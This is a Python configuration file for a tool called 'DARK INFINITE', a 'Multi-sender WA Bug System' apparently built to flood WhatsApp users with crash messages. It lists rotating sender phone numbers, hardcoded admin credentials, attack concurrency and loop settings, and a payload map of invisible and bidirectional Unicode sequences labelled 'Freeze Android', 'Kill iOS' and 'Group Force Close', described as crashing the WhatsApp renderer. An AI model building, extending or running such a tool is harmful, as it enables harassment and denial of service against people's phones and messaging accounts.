"""
DARK INFINITE - Core Configuration
Multi-sender WA Bug System
"""

import os

# ==================== SERVER CONFIG ====================
HOST = "0.0.0.0"
PORT = 8000
DEBUG = True

# ==================== DATABASE ====================
DATABASE_PATH = "dark_infinite.db"

# ==================== GLOBAL SENDERS ====================
# These are the global sender numbers that rotate automatically
GLOBAL_SENDERS = [
    "62819555831",
    "62853555291",
    "62857555754"
]

# ==================== AUTH ====================
ADMIN_CREDENTIALS = {
    "dark": "infinite",
    "infinite": "dark"
}

# ==================== BUG ENGINE CONFIG ====================
MAX_CONCURRENT_ATTACKS = 5
DEFAULT_LOOP_COUNT = 10
LOOP_INTERVAL_SECONDS = 1.5
PAYLOAD_MULTIPLIER = 5  # How many times to repeat payload per send
MAX_PAYLOAD_MULTIPLIER = 50

# ==================== PAYLOAD DEFINITIONS ====================
# Invisible character combos that crash WA rendering engine
PAYLOAD_MAP = {
    "Freeze Android": [
        "\uA9C4", "\uA9BE", "\u202E", "\u202C", "\u200B",
        "\u200E", "\u200F", "\u202D", "\u202E"
    ],
    "Force Close Android": [
        "\uA9BE", "\uA9C4", "\u202C", "\u200B", "\u200F",
        "\u202E", "\u202D", "\u2066", "\u2069"
    ],
    "Kill Android": [
        "\uA9C4", "\uA9BE", "\u202E", "\u200B", "\u200F",
        "\u202C", "\u2066", "\u2069", "\u200E", "\u202D"
    ],
    "Kill iOS": [
        "\uA9BE", "\uA9C4", "\u202C", "\u200E", "\u200B",
        "\u202D", "\u202E", "\u2066", "\u2069", "\u200F"
    ],
    "Group Freeze": [
        "\uA9C4", "\uA9BE", "\u202E", "\u200B", "\u200C",
        "\u200D", "\u200E", "\u200F", "\u202C", "\u202D"
    ],
    "Group Force Close": [
        "\uA9BE", "\uA9C4", "\u202C", "\u200E", "\u200F",
        "\u200B", "\u202E", "\u2066", "\u2069"
    ],
}

# ==================== RATE LIMITING ====================
RATE_LIMIT_PER_MINUTE = 30
COOLDOWN_SECONDS = 2